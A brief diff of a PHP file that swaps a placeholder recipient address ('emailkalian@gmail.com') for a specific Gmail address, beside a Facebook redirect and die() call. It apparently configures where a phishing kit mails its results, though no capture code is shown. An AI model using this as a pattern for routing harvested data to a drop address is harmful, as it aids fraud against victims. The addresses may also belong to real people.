@@ -6,5 +6,5 @@ header('https://www.facebook.com/IdhamDotID');
 die();
 }
 
-$mailto = "emailkalian@gmail.com";
+$mailto = "aldilntk34@gmail.com";
 ?>
